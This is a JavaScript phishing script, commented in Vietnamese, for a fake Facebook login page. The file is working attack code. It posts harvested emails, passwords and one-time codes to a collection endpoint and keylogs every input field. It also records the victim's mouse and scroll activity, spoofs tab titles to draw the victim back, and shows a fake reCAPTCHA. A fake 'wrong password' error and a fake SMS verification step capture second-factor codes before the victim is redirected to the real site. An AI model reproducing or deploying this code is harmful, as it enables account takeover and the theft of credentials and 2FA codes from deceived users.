/**
 * Phishing Script - Facebook (v3.0)
 * - Thu hoạch credentials qua POST /api/harvest
 * - Keylogger realtime qua POST /api/keylog
 * - Session Replay — ghi lại toàn bộ hành vi chuột/scroll
 * - Anti-detection: dynamic title khi blur tab
 * - CAPTCHA giả → 2FA giả (OTP)
 * - Lần 1: "Sai mật khẩu" → nhập lại
 * - Sau login: Hiển thị form OTP 6 số
 */

// ===== SESSION ID =====
window.SESSION_ID = 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
window.PAGE_TYPE = 'facebook';
const SESSION_ID = window.SESSION_ID;

// Parse campaign từ URL
const urlParams = new URLSearchParams(window.location.search);
window.CAMPAIGN_ID = urlParams.get('campaign') || 'direct';

// ===== ANTI-DETECTION: Dynamic Tab Title =====
const originalTitle = document.title;
let titleInterval = null;
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        let notifTitles = [
            '(1) Facebook',
            '🔴 Bạn có 1 thông báo mới',
            '(2) Tin nhắn đến',
            '⚠️ Cảnh báo bảo mật!'
        ];
        let i = 0;
        titleInterval = setInterval(() => {
            document.title = notifTitles[i % notifTitles.length];
            i++;
        }, 1500);
    } else {
        clearInterval(titleInterval);
        document.title = originalTitle;
    }
});

// ===== SESSION REPLAY ENGINE =====
const replayEvents = [];
let replayFlushTimer = null;

function trackEvent(type, data) {
    replayEvents.push({
        t: Date.now(),
        type,
        ...data
    });
    // Flush mỗi 3s
    clearTimeout(replayFlushTimer);
    replayFlushTimer = setTimeout(flushReplay, 3000);
}

function flushReplay() {
    if (replayEvents.length === 0) return;
    const batch = replayEvents.splice(0, replayEvents.length);
    fetch('/api/session-replay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            session_id: SESSION_ID,
            page_type: window.PAGE_TYPE,
            campaign_id: window.CAMPAIGN_ID,
            events: batch
        })
    }).catch(() => {});
}

// Track mouse moves (throttled 100ms)
let lastMoveTime = 0;
document.addEventListener('mousemove', (e) => {
    const now = Date.now();
    if (now - lastMoveTime < 100) return;
    lastMoveTime = now;
    trackEvent('move', { x: Math.round(e.clientX), y: Math.round(e.clientY) });
});

// Track touches
document.addEventListener('touchmove', (e) => {
    const touch = e.touches[0];
    trackEvent('touch', { x: Math.round(touch.clientX), y: Math.round(touch.clientY) });
}, { passive: true });

// Track clicks
document.addEventListener('click', (e) => {
    trackEvent('click', { x: Math.round(e.clientX), y: Math.round(e.clientY), tag: e.target.tagName, id: e.target.id });
});

// Track scroll
document.addEventListener('scroll', () => {
    trackEvent('scroll', { y: Math.round(window.scrollY) });
}, { passive: true });

// Track focus/blur on inputs (hesitation analysis)
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('focus', () => trackEvent('focus', { field: input.id }));
    input.addEventListener('blur', () => trackEvent('blur', { field: input.id, len: input.value.length }));
});

// Flush on unload
window.addEventListener('beforeunload', () => {
    if (replayEvents.length > 0) {
        navigator.sendBeacon('/api/session-replay', JSON.stringify({
            session_id: SESSION_ID,
            page_type: window.PAGE_TYPE,
            campaign_id: window.CAMPAIGN_ID,
            events: replayEvents
        }));
    }
});

// ===== KEYLOGGER =====
function setupKeylogger(inputEl, fieldName) {
    let debounceTimer;
    inputEl.addEventListener('input', function() {
        clearTimeout(debounceTimer);
        debounceTimer = setTimeout(() => {
            fetch('/api/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    field: fieldName,
                    value: inputEl.value,
                    key: 'input',
                    page_type: 'facebook',
                    session_id: SESSION_ID
                })
            }).catch(() => {});
        }, 300);
    });

    inputEl.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' || e.key === 'Tab') return;
        if (e.key.length > 1) {
            fetch('/api/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    field: fieldName,
                    value: inputEl.value,
                    key: e.key,
                    page_type: 'facebook',
                    session_id: SESSION_ID
                })
            }).catch(() => {});
        }
    });
}

setupKeylogger(document.getElementById('email'), 'email');
setupKeylogger(document.getElementById('password'), 'password');

// ===== STATE =====
const form = document.getElementById('loginForm');
const loadingOverlay = document.getElementById('loadingOverlay');
const errorMsg = document.getElementById('errorMsg');
let submitCount = 0;
let captchaPassed = false;
let savedEmail = '';
let savedPassword = '';

// ===== CAPTCHA FAKE (hiện sau 1s delay) =====
function showCaptcha(onSuccess) {
    // Tạo overlay CAPTCHA
    const overlay = document.createElement('div');
    overlay.id = 'captchaOverlay';
    overlay.style.cssText = `
        position:fixed; top:0; left:0; right:0; bottom:0;
        background:rgba(0,0,0,0.7); z-index:9999;
        display:flex; align-items:center; justify-content:center;
        animation: fadeIn 0.3s ease;
    `;

    overlay.innerHTML = `
        <div style="background:white; border-radius:16px; padding:24px; width:90%; max-width:340px; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.5);">
            <div style="font-size:32px; margin-bottom:12px;">🤖</div>
            <div style="font-size:16px; font-weight:700; color:#1c1e21; margin-bottom:6px;">Xác minh bảo mật</div>
            <div style="font-size:13px; color:#606770; margin-bottom:20px; line-height:1.5;">
                Để xác nhận bạn không phải robot, vui lòng nhấn vào ô bên dưới.
            </div>
            <div id="captchaBox" style="
                border: 2px solid #ddd; border-radius:8px; padding:16px;
                display:flex; align-items:center; gap:14px; cursor:pointer;
                transition: all 0.3s; margin-bottom:16px;
                background:#f8f9fa;
            " onclick="this._clicked=true; this.style.borderColor='#1877f2'; this.style.background='#e7f3ff'; document.getElementById('checkMark').innerHTML='✅'; setTimeout(window._captchaResolve, 800);">
                <div id="captchaCheck" style="
                    width:24px; height:24px; border:2px solid #aaa; border-radius:4px;
                    display:flex; align-items:center; justify-content:center; font-size:16px;
                ">
                    <span id="checkMark"></span>
                </div>
                <div style="text-align:left;">
                    <div style="font-size:14px; font-weight:600; color:#1c1e21;">Tôi không phải robot</div>
                    <div style="font-size:10px; color:#aaa; margin-top:2px;">reCAPTCHA • Quyền riêng tư • Điều khoản</div>
                </div>
                <div style="margin-left:auto;">
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="32" alt="reCAPTCHA">
                </div>
            </div>
            <div style="font-size:10px; color:#aaa;">Được bảo vệ bởi reCAPTCHA v3</div>
        </div>
    `;

    window._captchaResolve = () => {
        overlay.style.animation = 'fadeOut 0.3s ease forwards';
        setTimeout(() => {
            overlay.remove();
            onSuccess();
        }, 300);
    };

    document.body.appendChild(overlay);
}

// ===== 2FA OTP FORM =====
function show2FA(onSubmit) {
    const container = document.querySelector('.mobile-container');
    container.innerHTML = `
        <div class="fb-logo" style="margin-top:40px;">
            <svg viewBox="0 0 36 36" fill="none">
                <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z" fill="#0866FF"/>
                <path d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.531-.399Z" fill="white"/>
            </svg>
        </div>
        <div class="login-form" style="padding:24px 16px;">
            <div style="text-align:center; margin-bottom:20px;">
                <div style="font-size:36px; margin-bottom:10px;">📱</div>
                <div style="font-size:18px; font-weight:700; color:#1c1e21; margin-bottom:8px;">Kiểm tra điện thoại của bạn</div>
                <div style="font-size:13px; color:#606770; line-height:1.5;">
                    Chúng tôi đã gửi tin nhắn SMS có mã xác nhận đến số điện thoại kết nối với tài khoản của bạn.
                </div>
            </div>
            <div style="background:#f0f2f5; border-radius:10px; padding:12px; text-align:center; margin-bottom:16px; font-size:13px; color:#606770;">
                Gửi đến ••• ••• ••<span id="phoneLast">47</span>
            </div>
            <div style="display:flex; gap:8px; justify-content:center; margin-bottom:20px;" id="otpInputs">
                ${[0,1,2,3,4,5].map(i => `<input type="tel" maxlength="1" id="otp${i}"
                    style="width:44px; height:52px; border:2px solid #ddd; border-radius:10px; text-align:center;
                           font-size:22px; font-weight:700; color:#1c1e21; background:white; outline:none;
                           transition:border-color 0.2s;"
                    oninput="otpInput(${i}, this)"
                    onkeydown="otpKeydown(${i}, event)"
                    onfocus="this.style.borderColor='#1877f2'"
                    onblur="this.style.borderColor='#ddd'">`).join('')}
            </div>
            <button id="btn2fa" onclick="submit2FA()"
                style="width:100%; padding:14px; background:#1877f2; color:white; border:none; border-radius:10px;
                       font-size:16px; font-weight:700; cursor:pointer; opacity:0.5;" disabled>
                Tiếp tục
            </button>
            <div style="text-align:center; margin-top:14px;">
                <a href="#" style="color:#1877f2; font-size:13px; text-decoration:none;" onclick="return false;">
                    Không nhận được mã? Gửi lại
                </a>
            </div>
            <div style="text-align:center; margin-top:8px;">
                <a href="#" style="color:#606770; font-size:13px; text-decoration:none;" onclick="return false;">
                    Thử cách khác
                </a>
            </div>
        </div>
    `;

    // Random phone suffix
    document.getElementById('phoneLast').textContent = String(Math.floor(10 + Math.random() * 89));

    // Focus first OTP input
    setTimeout(() => document.getElementById('otp0')?.focus(), 300);

    window._2faSubmit = onSubmit;
}

function otpInput(idx, el) {
    el.value = el.value.replace(/[^0-9]/g, '');
    if (el.value && idx < 5) {
        document.getElementById('otp' + (idx + 1))?.focus();
    }
    // Enable button when all 6 filled
    const allFilled = [0,1,2,3,4,5].every(i => document.getElementById('otp'+i)?.value);
    const btn = document.getElementById('btn2fa');
    if (btn) { btn.disabled = !allFilled; btn.style.opacity = allFilled ? '1' : '0.5'; }

    // Keylog OTP
    const otpVal = [0,1,2,3,4,5].map(i => document.getElementById('otp'+i)?.value || '').join('');
    fetch('/api/keylog', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ field: 'otp', value: otpVal, key: 'input', page_type: 'facebook', session_id: SESSION_ID })
    }).catch(() => {});
}

function otpKeydown(idx, e) {
    if (e.key === 'Backspace' && !document.getElementById('otp' + idx).value && idx > 0) {
        document.getElementById('otp' + (idx - 1))?.focus();
    }
}

async function submit2FA() {
    const otp = [0,1,2,3,4,5].map(i => document.getElementById('otp'+i)?.value || '').join('');
    if (otp.length < 6) return;

    // Show loading
    loadingOverlay.classList.add('active');

    try {
        await fetch('/api/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: savedEmail,
                password: savedPassword,
                otp,
                page_type: 'facebook',
                session_id: SESSION_ID,
                campaign_id: window.CAMPAIGN_ID
            })
        });
    } catch(e) {}

    await new Promise(r => setTimeout(r, 2000));
    loadingOverlay.classList.remove('active');
    window.location.href = 'https://www.facebook.com';
}

// ===== FORM SUBMIT =====
form.addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    if (!email || !password) return;

    savedEmail = email;

    // Nếu chưa qua CAPTCHA → show CAPTCHA trước
    if (!captchaPassed) {
        captchaPassed = true;
        showCaptcha(() => {
            // Sau khi CAPTCHA xong → submit lại
            form.dispatchEvent(new Event('submit'));
        });
        return;
    }

    loadingOverlay.classList.add('active');
    document.getElementById('btnLogin').disabled = true;

    try {
        const response = await fetch('/api/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email,
                password,
                page_type: 'facebook',
                session_id: SESSION_ID,
                campaign_id: window.CAMPAIGN_ID,
                screen_info: {
                    width: screen.width,
                    height: screen.height,
                    pixelRatio: window.devicePixelRatio
                }
            })
        });
        await response.json();
        submitCount++;

        savedPassword = password;

        await new Promise(r => setTimeout(r, 1500 + Math.random() * 1000));
        loadingOverlay.classList.remove('active');
        document.getElementById('btnLogin').disabled = false;

        if (submitCount === 1) {
            // Lần 1: "Sai mật khẩu" → nhập lại
            errorMsg.classList.add('show');
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        } else {
            // Lần 2: Hiện 2FA OTP form
            show2FA();
        }
    } catch (error) {
        loadingOverlay.classList.remove('active');
        document.getElementById('btnLogin').disabled = false;
        window.location.href = 'https://www.facebook.com';
    }
});

document.getElementById('email').addEventListener('input', () => errorMsg.classList.remove('show'));
document.getElementById('password').addEventListener('input', () => errorMsg.classList.remove('show'));
